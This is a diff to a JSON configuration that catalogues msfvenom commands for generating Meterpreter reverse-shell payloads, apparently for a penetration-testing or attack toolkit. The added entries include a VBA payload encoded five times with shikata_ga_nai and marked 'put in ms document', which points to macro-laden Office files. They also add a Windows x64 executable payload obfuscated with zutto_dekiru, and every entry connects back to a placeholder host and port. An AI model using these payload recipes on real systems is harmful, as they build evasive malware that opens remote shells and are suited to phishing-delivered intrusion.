@@ -17,6 +17,11 @@
                 "name": "vbs_x86",
                 "generate": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -f vbs > payload_x86.vbs",
                 "usage": "START cscript.exe payload_x86.vbs"
+            },
+            {
+                "name": "vba-exe",
+                "generate": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -e x86/shikata_ga_nai -i 5 -f vba-exe > payload_x86.vba",
+                "usage": "put in ms document"
             }
         ]
     },
@@ -103,5 +108,19 @@
                 "generate": "msfvenom -p python/meterpreter_reverse_tcp LHOST=<host> LPORT=<port> -f raw > payload.py"
             }
         ]
+    },
+    {
+        "platform": "windows",
+        "port": 6009,
+        "stageencoder": "x64/zutto_dekiru",
+        "payload_name": "windows/x64/meterpreter/reverse_tcp",
+        "payloads": [
+            {
+                "name": "exe_x64",
+                "generate": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -e x64/zutto_dekiru -i 5 -f exe > payload_x64.exe"
+            }
+        ]
     }
+
+
 ]
